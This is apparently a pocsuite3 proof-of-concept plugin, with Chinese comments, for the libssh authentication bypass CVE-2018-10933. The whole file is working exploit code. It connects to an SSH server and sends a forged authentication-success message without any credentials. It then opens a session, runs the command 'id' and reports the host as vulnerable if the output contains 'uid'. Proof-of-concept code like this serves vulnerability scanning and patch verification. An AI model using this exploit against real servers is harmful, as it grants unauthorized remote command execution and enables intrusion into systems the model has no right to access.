# -*- coding: utf-8 -*-
# author: seven
# libssh 服务端权限认证绕过漏洞（CVE-2018-10933）

from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import sys
import paramiko
import socket

bufsize = 2048


def check(hostname, port):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command('id')

        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()
        stdout.close()
        stderr.close()

        result = (output+error).decode()
        if 'uid' in result:
            return True,result
    except paramiko.SSHException as e:
        logger.exception(e)
        logger.info("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
    except socket.error:
        logger.info("Unable to connect.")
    finally:
        sock.close()

    return False,''



class LibSSHUnAuthPOC(POCBase):
    vulID = 'CVE-2018-10933'
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 21, 2020'
    createDate = 'Jul 21, 2020'
    name = 'libssh认证绕过'
    appName = 'ssh'
    appVersion = 'v1.0.0'
    vulType = 'unauthorized'
    protocol = POC_CATEGORY.PROTOCOL.SSH

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 22
        res,evi =  check(host,port)
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['extra'] = evi
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(LibSSHUnAuthPOC)
